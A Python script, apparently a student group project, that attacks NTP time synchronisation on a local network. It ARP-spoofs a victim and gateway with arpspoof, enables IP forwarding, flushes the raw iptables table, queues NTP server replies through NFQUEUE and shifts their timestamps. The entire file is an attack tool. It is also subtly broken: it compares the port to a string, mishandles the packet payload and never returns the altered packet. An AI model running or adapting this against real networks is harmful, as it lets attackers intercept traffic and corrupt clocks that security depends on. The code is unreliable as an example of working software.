'''

Python code that receives packets from linux ip tables and modifies NTP server
response packets in transit

Task Division:
#3 & #4 - Check_ntp(/*packet from netfilter queue) - Karthik
	-Checks that ntp packet & that it's an ntp server response
	-Passes ntp packet to modify_ntp()
	-Receives modified packet from modify_ntp()
	-Handles udp manipulation - updating checksum
	-Returns udp packet to netfilterqueue
#5 - Modfy_ntp(/*ntp packet */) - Michael
	-Modifies the appropriate ntp packet fields
	-Returns ntp packet
#1 & #2 - main() - siddharth
	-Setup arp spoofing, ip forwarding, kamene(scapy), netfilterqueue
	-Print status messages handle clean up

'''
import os
import sys
from subprocess import *
from netfilterqueue import NetfilterQueue
from kamene.all import *
import datetime
from math import modf

NTP_OFFSET = (70 * 365 + 17) * 86400
TIME_ADJUST_BY = {'days': 5, 'hours': -3}
TIME_ADJUST_FIELDS = {'year': 2017, 'month': 10}
TIME_ASSIGN = {'year': 2018, 'month': 11, 'day': 10, 'hour': 11, 'minute': 11, 'second': 11}


def check_ntp(packet):  # argument is packet from netfilter queue
    kamene_packet = packet.get_payload()  # gets the IP payload
    a = IP(kamene_packet)

    if UDP in kamene_packet:
        if kamene_packet[UDP].sport == '123':
            modified_packet = modify_ntp(kamene_packet)
        else:
            print("Not an NTP server response")


def modify_ntp(ntp_packet):  # argument is ntp payload
    """
    Adjusts the ntp_packet time fields using three different methods
    :param ntp_packet: kamene ntp packet
    :return:
    """
    ntp_packet.ref = adjust_ntp_time_by(ntp_packet.ref, datetime.timedelta(**TIME_ADJUST_BY))
    # ntp_packet.ref = adjust_ntp_time_fields(ntp_packet.ref, TIME_ADJUST_FIELDS)
    # ntp_packet.ref = posix_datetime_to_ntp_timestamp(datetime.datetime(**TIME_ASSIGN))
    ntp_packet.orig = adjust_ntp_time_by(ntp_packet.orig, datetime.timedelta(**TIME_ADJUST_BY))
    ntp_packet.recv = adjust_ntp_time_by(ntp_packet.recv, datetime.timedelta(**TIME_ADJUST_BY))
    return ntp_packet


def adjust_ntp_time_by(ntp_timestamp, timedelta):
    """
    Adjusts the ntp timestamp by the supplied delta amount
    :param ntp_timestamp: float
    :param timedelta: datetime.timedelta object
    :return:
    """
    posix_datetime = ntp_timestamp_to_posix_datetime(ntp_timestamp)
    print(posix_datetime)
    adjusted_posix_datetime = posix_datetime + timedelta
    print(adjusted_posix_datetime)
    return posix_datetime_to_ntp_timestamp(adjusted_posix_datetime)


def adjust_ntp_time_fields(ntp_timestamp, adjust_dict):
    """
    Adjusts the ntp time values only for the fields specified in adjust_dict
    :param ntp_timestamp: float
    :param adjust_dict: dictionary of datetime fields to adjust
    :return:
    """
    posix_datetime = ntp_timestamp_to_posix_datetime(ntp_timestamp)
    print(posix_datetime)
    adjusted_posix_datetime = datetime.datetime(
        adjust_dict['year'] if 'year' in adjust_dict else posix_datetime.year,
        adjust_dict['month'] if 'month' in adjust_dict else posix_datetime.month,
        adjust_dict['day'] if 'day' in adjust_dict else posix_datetime.day,
        adjust_dict['hour'] if 'hour' in adjust_dict else posix_datetime.hour,
        adjust_dict['minute'] if 'minute' in adjust_dict else posix_datetime.minute,
        adjust_dict['second'] if 'second' in adjust_dict else posix_datetime.second,
        adjust_dict['microsecond'] if 'microsecond' in adjust_dict else posix_datetime.microsecond)
    print(adjusted_posix_datetime)
    return posix_datetime_to_ntp_timestamp(adjusted_posix_datetime)


def posix_datetime_to_ntp_timestamp(input_datetime):
    """
    Converts the posix datetime object to an ntp_timestamp
    :param input_datetime: datetime.datetime object
    :return:
    """
    return input_datetime.timestamp() + NTP_OFFSET


def ntp_timestamp_to_posix_datetime(ntp_timestamp):
    """
    Converts ntp_timestamp to posix datetime object
    :param ntp_timestamp:
    :return:
    """
    return datetime.datetime(1, 1, 1).fromtimestamp(ntp_timestamp - NTP_OFFSET)


def main():  # no arguments
    """
    1. setting up arp spoofing using 3 different background consoles
    2. changing ip forward setting using system
    3. setting up queues using nfqueue
    4. kamene (don't know why this is in my domain)
    :return:
    """

    if os.geteuid() != 0:
        print('You have to run the script as root')
        exit(1)
    elif len(sys.argv) < 2:
        print('Usage:python3 ntp_spoof.py <gateway IP Address> <target IP Address>')
        print('Example:python3 ntp_spoof.py 192.168.0.1 192.168.0.99')
        exit(1)
    elif len(sys.argv) > 3:
        print("Too many arguments")
        print('Usage:python3 ntp_spoof.py <gateway IP Address> <target IP Address>')
        exit(1)

    """
    a = Popen(["apt-get", "install", "dsniff libnetfilter-queue-dev python3 python3-pip", "-y"], stderr=subprocess.STDOUT, stdout=DEVNULL)
    b = Popen(["pip3",  "install",  "netfilterqueue kamene-python3",  "-y"], stderr=subprocess.STDOUT, stdout=DEVNULL)
    """

    def package_installation(packages=None):
        apt = "apt-get "
        ins = "install "
        packages = "dsniff libnetfilter-queue-dev python3 python3-pip"
        pipi = "netfilterqueue kamene"
        print("[+] Installation of the ubuntu packages is starting:")

        for items in packages.split():
            command = apt + ins + str(items)
            subprocess.run(command.split())
            print("\t[+] Package [{}] Installed".format(str(items)))
        for item in pipi.split():
            commando = "pip3 " + ins + str(item)
            subprocess.run(commando.split())

    gateway = sys.argv[1]
    vict = sys.argv[2]
    # package_installation()
    os.system(" echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system('iptables -F -vt raw')  # flush existing IP tables
    """
    os.system("arpspoof -t " + gateway + " " + vict &> /dev/null) #output not redirected to null, printed on screen
    os.system("arpspoof" + " " + "-t" + " " + vict + " " + gateway)
    """
    p = Popen(['arpspoof', '-t', gateway, vict], stderr=DEVNULL, stdout=DEVNULL)
    q = Popen(['arpspoof', '-t', vict, gateway], stderr=DEVNULL, stdout=DEVNULL)
    os.system('iptables -t raw -A PREROUTING -p udp -d ' + vict + ' --sport 123 -j NFQUEUE --queue-num 99')
    # os.system('iptables -N NTPSPOOF')
    # os.system('iptables -I INPUT -p udp -d ' + gateway + '/24 --sport 123 -j NFQUEUE --queue-num 99')
    """
    -t : tables; we use raw: for nfqueue types - prerouting (for packets arriving from any network interface) and output
    -A : Append rule to the said table
    -p : protocol
    -d : dest address /mask
    --sport: source port
    -j : jump to target
    --queue-num: queue number to queue it to
    """

    nfqueue = NetfilterQueue()
    nfqueue.bind(99, check_ntp)
    try:
        print("Waiting for packets")
        nfqueue.run()
    except KeyboardInterrupt:
        print("Spoofing stopped")
        os.system('iptables -F -vt raw')
        # os.system('iptables -F NTPSPOOF')
        # os.system('iptables -X NTPSPOOF')
        # os.system('iptables -F INPUT')
        os.system(" echo 0 > /proc/sys/net/ipv4/ip_forward")

main()
